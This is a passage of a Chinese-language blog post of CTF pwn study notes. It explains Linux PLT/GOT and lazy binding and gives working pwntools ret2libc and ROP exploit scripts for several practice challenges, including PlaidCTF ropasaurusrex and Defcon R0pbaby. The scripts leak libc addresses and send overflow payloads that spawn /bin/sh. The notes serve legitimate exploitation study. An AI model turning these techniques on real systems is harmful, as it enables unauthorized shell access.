hex(puts_got)</span><br><span class="line">print &quot;[*]_start addr: &quot; + hex(start_addr)</span><br><span class="line">print &quot;[*]libc addr: &quot; + hex(libc.address)</span><br><span class="line">print &quot;--&quot; * 20</span><br><span class="line">print &quot;[*]sending payload1 to leak libc...&quot;</span><br><span class="line"></span><br><span class="line">payload = flat([&quot;A&quot; * 112, puts_plt, start_addr, puts_got])</span><br><span class="line"></span><br><span class="line">sh.sendlineafter(&quot;Can you find it !?&quot;, payload)</span><br><span class="line">puts_addr = u32(sh.recv(4))</span><br><span class="line">print &quot;[*]leak puts addr: &quot; + hex(puts_addr)</span><br><span class="line"></span><br><span class="line">libc.address = puts_addr - libc.symbols[&apos;puts&apos;]</span><br><span class="line">system_addr = libc.symbols[&apos;system&apos;]</span><br><span class="line">binsh_addr = next(libc.search(&apos;/bin/sh&apos;))</span><br><span class="line">print &quot;[*]leak libc addr: &quot; + hex(libc.address)</span><br><span class="line">print &quot;[*]system addr: &quot; + hex(system_addr)</span><br><span class="line">print &quot;[*]binsh addr: &quot; + hex(binsh_addr)</span><br><span class="line">print &quot;--&quot; * 20</span><br><span class="line">print &quot;[*]sending payload2 to getshell...&quot;</span><br><span class="line"></span><br><span class="line">payload2 = flat([&quot;B&quot; * 112, system_addr, &quot;CCCC&quot;, binsh_addr])</span><br><span class="line">sh.sendline(payload2)</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure>
+
+<h3 id="train-cs-nctu-edu-tw：ret2libc"><a href="#train-cs-nctu-edu-tw：ret2libc" class="headerlink" title="train.cs.nctu.edu.tw：ret2libc"></a>train.cs.nctu.edu.tw：ret2libc</h3><p>这道题开启了 NX 保护，然而运行的时候会把 puts 的地址跟 /bin/sh 的地址告诉我们，使用 pwntools 可以把地址提取出来，再根据 libcsearcher 查出 system 的地址，这样就可以 getshell 了</p>
+<p>exp：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">from LibcSearcher import LibcSearcher</span><br><span class="line">p=process(&apos;./pwn&apos;)</span><br><span class="line">p.recvuntil(&apos;is &apos;)</span><br><span class="line">bin_addr = int(p.recvuntil(&apos;\n), 16)</span><br><span class="line">print hex(bin_addr)</span><br><span class="line">p.recvuntil(&apos;is &apos;)</span><br><span class="line">puts_addr = int(p.recvuntil(&apos;\n&apos;), 16)</span><br><span class="line">print hex(puts_addr)</span><br><span class="line">libc=LibcSearcher(&apos;puts&apos;,puts_addr)</span><br><span class="line">libc_base=puts_addr-libc.dump(&apos;puts&apos;)</span><br><span class="line">sys_addr=libc_base+libc.dump(&apos;system&apos;)</span><br><span class="line">payload2=&apos;a&apos;*32+p32(sys_addr)+p32(1234)+p32(bin_addr)</span><br><span class="line">p.sendline(payload2)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+
+<p>讲一下 <code>p.recvuntil(&#39;is &#39;)</code> 代表的是 “is “之前的那一块，当下一个 recvuntil 的时候就会把这那块去掉了</p>
+<p>把脚本里的第一个 <code>p.recvuntil(&#39;is &#39;)</code> 替换成 </p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">print p.recvuntil(&apos;of &apos;)</span><br><span class="line">print p.recvuntil(&apos;is &apos;)</span><br></pre></td></tr></table></figure>
+
+<p>就可以看出来作用是什么</p>
+<p><img src="https://cdn.nlark.com/yuque/0/2019/png/268938/1574586037138-97e8c208-e876-48ca-b9cd-0a64d829175f.png" alt="image.png"></p>
+<p>ps.正常会输出这一些（”^C”是ctrl+c退出造成的，不包括）：</p>
+<p><img src="https://cdn.nlark.com/yuque/0/2019/png/268938/1574586260374-add330e2-4491-4b46-9980-2f450c34faf6.png" alt="image.png"></p>
+<h2 id="Linux动态链接"><a href="#Linux动态链接" class="headerlink" title="Linux动态链接"></a>Linux动态链接</h2><p><a href="https://blog.csdn.net/linyt/article/details/51635768" target="_blank" rel="noopener">参考博文</a></p>
+<p>关于动态链接与静态链接，可以打个比方就是：如果我的文章引用了别人的一部分文字，在我发布文章的时候把别人的段落复制到我的文章里面就属于静态连接，而做一个超链接让你们自己去看就属于动态链接了</p>
+<h3 id="PLT-amp-GOT"><a href="#PLT-amp-GOT" class="headerlink" title="PLT&amp;GOT"></a>PLT&amp;GOT</h3><p>linux下的动态链接是通过PLT&amp;GOT来实现的，这里做一个实验，通过这个实验来理解</p>
+<p>使用如下源代码 test.c：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line">void print_banner()</span><br><span class="line">&#123;</span><br><span class="line">    printf(&quot;Welcome to World of PLT and GOT\n&quot;);</span><br><span class="line">&#125;</span><br><span class="line">int main(void)</span><br><span class="line">&#123;</span><br><span class="line">    print_banner();</span><br><span class="line">    return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>依次使用下列命令进行编译：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">gcc -Wall -g -o test.o -c test.c -m32</span><br><span class="line">gcc -o test test.o -m32</span><br></pre></td></tr></table></figure>
+
+<p>这样除了原有的 test.c 还有个 test.o 以及可执行文件 test</p>
+<p>通过 <code>objdump -d test.o</code> 可以查看反汇编</p>
+<p><img src="https://cdn.nlark.com/yuque/0/2019/png/268938/1574510177475-db49a7d5-6909-421e-a868-6829c9a7b4a4.png" alt="image.png"></p>
+<p>printf() 和函数是在 glibc 动态库里面的，只有当程序运行起来的时候才能确定地址，所以此时的 printf() 函数先用 fc ff ff ff 也就是有符号数的 -4 代替</p>
+<p>运行时进行重定位是无法修改代码段的，只能将 printf 重定位到数据段，但是已经编译好的程序，调用 printf 的时候怎么才能找到这个地址呐？</p>
+<p>链接器会额外生成一小段代码，通过这段代码来获取 printf() 的地址，像下面这样，进行链接的时候只需要对printf_stub() 进行重定位操作就可以</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">.text</span><br><span class="line">...</span><br><span class="line"></span><br><span class="line">// 调用printf的call指令</span><br><span class="line">call printf_stub</span><br><span class="line">...</span><br><span class="line">printf_stub:</span><br><span class="line">    mov rax, [printf函数的储存地址] // 获取printf重定位之后的地址</span><br><span class="line">    jmp rax // 跳过去执行printf函数</span><br><span class="line"></span><br><span class="line">.data</span><br><span class="line">...</span><br><span class="line">printf函数的储存地址,这里储存printf函数重定位后的地址</span><br></pre></td></tr></table></figure>
+
+<p>总体来说，动态链接每个函数需要两个东西：</p>
+<p>1、用来存放外部函数地址的数据段</p>
+<p>2、用来获取数据段记录的外部函数地址的代码</p>
+<p>应有两个表，一个用来存放外部的函数地址的数据表称为<strong>全局偏移表</strong>（<strong>GOT</strong>, Global Offset Table），那个存放额外代码的表称为<strong>程序链接表</strong>（<strong>PLT</strong>，Procedure Link Table）</p>
+<p><img src="https://cdn.nlark.com/yuque/0/2019/jpeg/268938/1574513788142-e66171f3-6300-4e14-ab57-cc301c936829.jpeg" alt="20160611124517413.jpg"></p>
+<p>可执行文件里面保存的是 PLT 表的地址，对应 PLT 地址指向的是 GOT 的地址，GOT 表指向的就是 glibc 中的地址</p>
+<p>那我们可以发现，在这里面想要通过 plt 表获取函数的地址，首先要保证 got 表已经获取了正确的地址，但是在一开始就进行所有函数的重定位是比较麻烦的，为此，linux 引入了延迟绑定机制</p>
+<h3 id="延迟绑定"><a href="#延迟绑定" class="headerlink" title="延迟绑定"></a>延迟绑定</h3><p>只有动态库函数在被调用时，才会地址解析和重定位工作，为此可以使用类似这样的代码来实现：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">//一开始没有重定位的时候将 printf@got 填成 lookup_printf 的地址</span><br><span class="line">void printf@plt()</span><br><span class="line">&#123;</span><br><span class="line">address_good:</span><br><span class="line">    jmp *printf@got   </span><br><span class="line">lookup_printf:</span><br><span class="line">    调用重定位函数查找 printf 地址，并写到 printf@got</span><br><span class="line">    goto address_good;//再返回去执行address_good</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>说明一下这段代码工作流程，一开始，printf@got 是 lookup_printf 函数的地址，这个函数用来寻找 printf() 的地址，然后写入 printf@got，lookup_printf 执行完成后会返回到 address_good，这样再 jmp 的话就可以直接跳到printf 来执行了</p>
+<p>也就是说这样的机制的话如果不知道 printf 的地址，就去找一下，知道的话就直接去 jmp 执行 printf 了</p>
+<p>接下来，我们就来看一下这个“找”的工作是怎么实现的：</p>
+<p>通过 <code>objdump -d test &gt; test.asm</code> 可以看到其中 plt 表项有三条指令</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">Disassembly of section .plt:</span><br><span class="line"></span><br><span class="line">080482d0 &lt;common@plt&gt;:</span><br><span class="line"> 80482d0:   ff 35 04 a0 04 08       pushl  0x804a004</span><br><span class="line"> 80482d6:   ff 25 08 a0 04 08       jmp    *0x804a008</span><br><span class="line"> 80482dc:   00 00                   add    %al,(%eax)</span><br><span class="line">    ...</span><br><span class="line"></span><br><span class="line">080482e0 &lt;puts@plt&gt;:</span><br><span class="line"> 80482e0:   ff 25 0c a0 04 08       jmp    *0x804a00c</span><br><span class="line"> 80482e6:   68 00 00 00 00          push   $0x0</span><br><span class="line"> 80482eb:   e9 e0 ff ff ff          jmp    80482d0 &lt;_init+0x28&gt;</span><br><span class="line"></span><br><span class="line">080482f0 &lt;__libc_start_main@plt&gt;:</span><br><span class="line"> 80482f0:   ff 25 10 a0 04 08       jmp    *0x804a010</span><br><span class="line"> 80482f6:   68 08 00 00 00          push   $0x8</span><br><span class="line"> 80482fb:   e9 d0 ff ff ff          jmp    80482d0 &lt;_init+0x28&gt;</span><br></pre></td></tr></table></figure>
+
+<p>ps.这里 plt 表的第一项使用 objdump 的时候给没有符号名的一项自动改成了离他最近的一项，为了避免引起误会，改成了 common，而且随着不断深入，会发现，确实可以叫 common</p>
+<p>其中除第一个表项以外，plt 表的第一条都是跳转到对应的 got 表项，而 got 表项的内容我们可以通过 gdb 来看一下，如果函数还没有执行的时候，这里的地址是对应 plt 表项的下一条命令，即 push 0x0</p>
+<p>（说一下怎么查看，先 <code>gdb test</code> 然后 <code>b main</code>，再 <code>run</code>， 再 <code>x/x jmp的那个地址</code> 就可以）</p>
+<p><img src="https://cdn.nlark.com/yuque/0/2020/png/268938/1580779496150-487cd998-b4af-4bb0-ad41-9ab376a7f8ff.png" alt="image.png"></p>
+<p>还得之前我们说的，在还没有执行过函数之前 printf@got 的内容是 lookup_printf 函数的地址吗，这就是要去找 printf 函数的地址了</p>
+<p>现在要做的是：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">push   $0x0    //将数据压到栈上，作为将要执行的函数的参数</span><br><span class="line">jmp    0x80482d0   //去到了第一个表项</span><br></pre></td></tr></table></figure>
+
+<p>接下来继续</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">080482d0 &lt;common@plt&gt;:</span><br><span class="line">pushl  0x804a004  //将数据压到栈上，作为后面函数的参数</span><br><span class="line">jmp    *0x804a008 //跳转到函数</span><br><span class="line">add    %al,(%eax)</span><br><span class="line">    ...</span><br></pre></td></tr></table></figure>
+
+<p>我们同样可以使用 gdb 来看一下这里面到底是什么，可以看到，在没有执行之前是全 0</p>
+<p><img src="https://cdn.nlark.com/yuque/0/2020/png/268938/1580780401627-53526fc2-3646-4478-b040-8f1fb30ca0dc.png" alt="image.png"></p>
+<p>当执行后他有了值</p>
+<p><img src="https://cdn.nlark.com/yuque/0/2020/png/268938/1580780428606-42b2c58b-1809-43dc-8b4e-afa79a1456cf.png" alt="image.png"></p>
+<p>这个值对应的函数是 <code>_dl_runtime_resolve</code></p>
+<p>那现在做一个小总结：</p>
+<p>在想要调用的函数没有被调用过，想要调用他的时候，是按照这个过程来调用的</p>
+<p>xxx@plt -&gt; xxx@got -&gt; xxx@plt -&gt; 公共@plt -&gt; _dl_runtime_resolve</p>
+<p>到这里我们还需要知道</p>
+<ol>
+<li>_dl_runtime_resolve 是怎么知道要查找 printf 函数的</li>
+<li>_dl_runtime_resolve 找到 printf 函数地址之后，它怎么知道回填到哪个 GOT 表项</li>
+</ol>
+<p>第一个问题，在 xxx@plt 中，我们在 jmp 之前 push 了一个参数，每个 xxx@plt 的 push 的操作数都不一样，那个参数就相当于函数的 id，告诉了 _dl_runtime_resolve 要去找哪一个函数的地址</p>
+<p>在 elf文件中 .rel.plt 保存了重定位表的信息，使用 <code>readelf -r test</code> 命令可以查看 test 可执行文件中的重定位信息</p>
+<p><img src="https://cdn.nlark.com/yuque/0/2020/png/268938/1580780626820-92e99da4-b8f0-43c7-b9df-1ba09342a0ff.png" alt="image.png"></p>
+<p>这里有些问题，对应着大佬博客说 plt 中 push 的操作数，就是对应函数在.rel.plt 段的偏移量，但是没对比出来</p>
+<p>第二个问题，看 .rel.plt 的位置就对应着 xxx@plt 里 jmp 的地址</p>
+<blockquote>
+<p>在 i386 架构下，除了每个函数占用一个 GOT 表项外，GOT 表项还保留了３个公共表项，也即 got 的前３项，分别保存：</p>
+<p><strong>got [0]: 本 ELF 动态段 (.dynamic 段）的装载地址</strong> </p>
+<p><strong>got [1]：本 ELF 的 link_map 数据结构描述符地址</strong> </p>
+<p><strong>got [2]：_dl_runtime_resolve 函数的地址</strong></p>
+<p>动态链接器在加载完 ELF 之后，都会将这３地址写到 GOT 表的前３项</p>
+</blockquote>
+<p><strong>跟着大佬的流程图来走一遍：</strong></p>
+<p>第一次调用</p>
+<p><img src="https://cdn.nlark.com/yuque/0/2020/jpeg/268938/1580739542097-a6d2738b-9a08-4b5f-acd8-d5f2c4d77278.jpeg" alt="img"></p>
+<p>之后再次调用<img src="https://cdn.nlark.com/yuque/0/2020/jpeg/268938/1580739570228-64997692-8003-4c10-acf2-2c8d91095e3c.jpeg" alt="img"></p>
+<h2 id="Practice"><a href="#Practice" class="headerlink" title="Practice"></a>Practice</h2><h3 id="train-cs-nctu-edu-tw：rop"><a href="#train-cs-nctu-edu-tw：rop" class="headerlink" title="train.cs.nctu.edu.tw：rop"></a>train.cs.nctu.edu.tw：rop</h3><p>没找到题目，从<a href="http://baymrx.me/2019/08/17/PWN刷题记录——train-cs-nctu-edu-tw-rop/" target="_blank" rel="noopener">大佬博客</a>里面找到的，题目使用 nc 连上以后会输出这些 gadgets 需要自己去构造 payload</p>
+<p><img src="https://cdn.nlark.com/yuque/0/2019/png/268938/1574668172344-2d5dce6a-3e6a-437a-bcc7-5a06950ee918.png" alt="1566026309029.png"></p>
+<p>把 push 的那一些16进制转换一下</p>
+<p><img src="https://cdn.nlark.com/yuque/0/2019/png/268938/1574668407609-8e44a3b0-4464-41c1-aad9-e9163a76d1c1.png" alt="image.png"></p>
+<p>大佬说通过这些就可以构造出 payload 了</p>
+<p>exp：我连不上。。。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">sh = remote(&apos;bamboofox.cs.nctu.edu.tw&apos;,10001)</span><br><span class="line">payload = &quot;9,9,1,10,9,3,3,12,4,12,2,2,8,8,8,8,8,0&quot;</span><br><span class="line">sh.sendline(payload)</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure>
+
+<h3 id="2013-PlaidCTF-ropasaurusrex"><a href="#2013-PlaidCTF-ropasaurusrex" class="headerlink" title="2013-PlaidCTF-ropasaurusrex"></a>2013-PlaidCTF-ropasaurusrex</h3><p>没有 system 和 /bin/sh，通过 ret2libc 的方法在libc里面找到，这里注意一下第一次泄露的是 got 表的内容，写成了 plt 的，结果废了两个小时没看出来，还以为又出现了什么超出知识水平的操作，，CTF需要视力！！</p>
+<p>exp：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">from LibcSearcher import LibcSearcher</span><br><span class="line">p=process(&apos;./rop&apos;)</span><br><span class="line">elf=ELF(&apos;./rop&apos;)</span><br><span class="line">write_plt=elf.plt[&apos;write&apos;]</span><br><span class="line">write_got=elf.got[&apos;write&apos;]</span><br><span class="line">payload=&apos;a&apos;*140+p32(write_plt)+p32(0x80483F4)+p32(1)+p32(write_got)+p32(4)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">write_addr=u32(p.recv(4))</span><br><span class="line">libc=LibcSearcher(&apos;write&apos;,write_addr)</span><br><span class="line">libc_base=write_addr-libc.dump(&apos;write&apos;)</span><br><span class="line">sys_addr=libc_base+libc.dump(&apos;system&apos;)</span><br><span class="line">bin_addr=libc_base+libc.dump(&apos;str_bin_sh&apos;)</span><br><span class="line">payload1=&apos;a&apos;*140+p32(sys_addr)+p32(1234)+p32(bin_addr)</span><br><span class="line">p.sendline(payload1)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+
+<h3 id="Defcon-2015-Qualifier-R0pbaby"><a href="#Defcon-2015-Qualifier-R0pbaby" class="headerlink" title="Defcon 2015 Qualifier: R0pbaby"></a>Defcon 2015 Qualifier: R0pbaby</h3><p>checksec 检查一下，发现是64位程序，所以参数应该是存储在 rdi 寄存器上</p>
+<p>64 位程序当参数少于 7 个时， 参数从左到右放入寄存器: rdi, rsi, rdx, rcx, r8, r9</p>
+<p>通过 ROPgadget –binary /libc/x86_64-linux-gnu/ libc.so.6 –only “pop|ret” | grep “rdi”</p>
+<p>获取到 pop rdi ；ret 的地址：</p>
+<p><img src="https://cdn.nlark.com/yuque/0/2019/png/268938/1574663502432-70335a77-3256-4ba8-adf0-f7208c5b7ed7.png" alt="image.png"></p>
+<p>通过程序自身提供的功能，可以获取到 libc 的地址与任意函数的地址</p>
+<p><img src="https://cdn.nlark.com/yuque/0/2019/png/268938/1574663904109-6e3aa29a-7ae6-48f4-98f6-7ba99c5cf511.png" alt="image.png"></p>
+<p>同时第三个功能存在溢出，经过计算溢出的长度为 8 </p>
+<p><img src="https://cdn.nlark.com/yuque/0/2019/png/268938/1574664880977-b87b80fb-e80a-43ad-b6c6-22fad2b1bda8.png" alt="image.png"></p>
+<p>写 exp：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line">p=process(<span class="string">'./pwn'</span>)</span><br><span class="line">elf=ELF(<span class="string">'./pwn'</span>)</span><br><span class="line">rdi_offset=<span class="number">0x0000000000021102</span></span><br><span class="line">p.recvuntil(<span class="string">': '</span>)</span><br><span class="line">p.sendline(<span class="string">'2'</span>)</span><br><span class="line">p.recvuntil(<span class="string">'symbol: '</span>)</span><br><span class="line">p.sendline(<span class="string">'system'</span>)</span><br><span class="line">p.recvuntil(<span class="string">': '</span>)</span><br><span class="line">sys_addr=p.recvuntil(<span class="string">'\n'</span>,drop=<span class="literal">True</span>)</span><br><span class="line">sys_addr=int(sys_addr,<span class="number">16</span>)</span><br><span class="line">libc=LibcSearcher(<span class="string">'system'</span>,sys_addr)</span><br><span class="line">libc_base=sys_addr-libc.dump(<span class="string">'system'</span>)</span><br><span class="line">bin_addr=libc_base+libc.dump(<span class="string">'str_bin_sh'</span>)</span><br><span class="line">rdi_addr=libc_base+rdi_offset</span><br><span class="line">payload=<span class="string">'a'</span>*<span class="number">8</span>+p64(rdi_addr)+p64(bin_addr)+p64(sys_addr)</span><br><span class="line">p.recvuntil(<span class="string">': '</span>)</span><br><span class="line">p.sendline(<span class="string">'3'</span>)</span><br><span class="line">p.recvuntil(<span class="string">'): '</span>)</span><br><span class="line">length=len(payload)</span><br><span class="line"><span class="keyword">print</span> length</span><br><span class="line"><span class="keyword">print</span> str(length)</span><br><span class="line">p.sendline(str(length))</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+
+<p>大佬的exp：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line">ropbaby = ELF(<span class="string">'./pwn'</span>)</span><br><span class="line">sh = process(<span class="string">'./pwn'</span>)</span><br><span class="line">context.word_size = <span class="number">64</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">getfuncaddress</span><span class="params">(func)</span>:</span></span><br><span class="line">    sh.recvuntil(<span class="string">': '</span>)</span><br><span class="line">    sh.sendline(<span class="string">'2'</span>)</span><br><span class="line">    sh.recvuntil(<span class="string">'symbol: '</span>)</span><br><span class="line">    sh.sendline(func)</span><br><span class="line">    sh.recvuntil(<span class="string">': '</span>)</span><br><span class="line">    addr = sh.recvuntil(<span class="string">'\n'</span>, drop=<span class="literal">True</span>)</span><br><span class="line">    <span class="keyword">return</span> int(addr, <span class="number">16</span>)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">addropbuff</span><span class="params">(payload)</span>:</span></span><br><span class="line">    sh.recvuntil(<span class="string">': '</span>)</span><br><span class="line">    sh.sendline(<span class="string">'3'</span>)</span><br><span class="line">    sh.recvuntil(<span class="string">'): '</span>)</span><br><span class="line">    length = len(payload)</span><br><span class="line">    sh.sendline(str(length))</span><br><span class="line">    sh.sendline(payload)</span><br><span class="line">rdi_ret_offset = <span class="number">0x0000000000021102</span></span><br><span class="line">system_addr = getfuncaddress(<span class="string">'system'</span>)</span><br><span class="line">libc = LibcSearcher(<span class="string">'system'</span>, system_addr)</span><br><span class="line">libc_base = system_addr - libc.dump(<span class="string">'system'</span>)</span><br><span class="line">binsh_addr = libc.dump(<span class="string">'str_bin_sh'</span>) + libc_base</span><br><span class="line">rdi_ret = rdi_ret_offset + libc_base</span><br><span class="line"><span class="keyword">print</span> hex(system_addr), hex(binsh_addr), hex(rdi_ret)</span><br><span class="line">payload = flat([<span class="string">'b'</span> * <span class="number">8</span>, rdi_ret, binsh_addr, system_addr])</span><br><span class="line">addropbuff(payload)</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure>
+
+
+    </div>
+
+    
+    
+    
+        
+      
+
+      <footer class="post-footer">
+
+        
+
+          <div class="post-nav">
+            <div class="post-nav-next post-nav-item">
+              
+                <a href="/2020/02/14/PWN-Tips-1/" rel="next" title="PWN-Tips-1">
+                  <i class="fa fa-chevron-left"></i> PWN-Tips-1
+                </a>
+              
+            </div>
+
+            <span class="post-nav-divider"></span>
+
+            <div class="post-nav-prev post-nav-item">
+              
+                <a href="/2020/02/25/80x86╗π▒α▒╩╝╟01/" rel="prev" title="80x86汇编笔记01">
+                  80x86汇编笔记01 <i class="fa fa-chevron-right"></i>
+                </a>
+              
+            </div>
+          </div>
+        
+      </footer>
+    
+  </div>
+  
+  
+  
+  </article>
+
+  </div>
+
+
+          </div>
+          
+
+        </div>
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside class="sidebar">
+    <div class="sidebar-inner">
+        
+        
+        
+        
+      
+
+      <ul class="sidebar-nav motion-element">
+        <li class="sidebar-nav-toc">
+          Inhaltsverzeichnis
+        </li>
+        <li class="sidebar-nav-overview">
+          Übersicht
+        </li>
+      </ul>
+
+      <!--noindex-->
+      <div class="post-toc-wrap sidebar-panel">
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#Basic-ROP"><span class="nav-number">1.</span> <span class="nav-text">Basic-ROP</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#ret2text"><span class="nav-number">1.1.</span> <span class="nav-text">ret2text</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#ret2shellcode"><span class="nav-number">1.2.</span> <span class="nav-text">ret2shellcode</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#sniperoj-pwn100-shellcode-x86-64："><span class="nav-number">1.3.</span> <span class="nav-text">sniperoj-pwn100-shellcode-x86-64：</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#ret2syscall"><span class="nav-number">1.4.</span> <span class="nav-text">ret2syscall</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#ret2libc"><span class="nav-number">1.5.</span> <span class="nav-text">ret2libc</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#例1"><span class="nav-number">1.5.1.</span> <span class="nav-text">例1</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#例2"><span class="nav-number">1.5.2.</span> <span class="nav-text">例2</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#例3"><span class="nav-number">1.5.3.</span> <span class="nav-text">例3</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#train-cs-nctu-edu-tw：ret2libc"><span class="nav-number">1.5.4.</span> <span class="nav-text">train.cs.nctu.edu.tw：ret2libc</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Linux动态链接"><span class="nav-number">1.6.</span> <span class="nav-text">Linux动态链接</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#PLT-amp-GOT"><span class="nav-number">1.6.1.</span> <span class="nav-text">PLT&amp;GOT</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#延迟绑定"><span class="nav-number">1.6.2.</span> <span class="nav-text">延迟绑定</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Practice"><span class="nav-number">1.7.</span> <span class="nav-text">Practice</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#train-cs-nctu-edu-tw：rop"><span class="nav-number">1.7.1.</span> <span class="nav-text">train.cs.nctu.edu.tw：rop</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#2013-PlaidCTF-ropasaurusrex"><span class="nav-number">1.7.2.</span> <span class="nav-text">2013-PlaidCTF-ropasaurusrex</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" 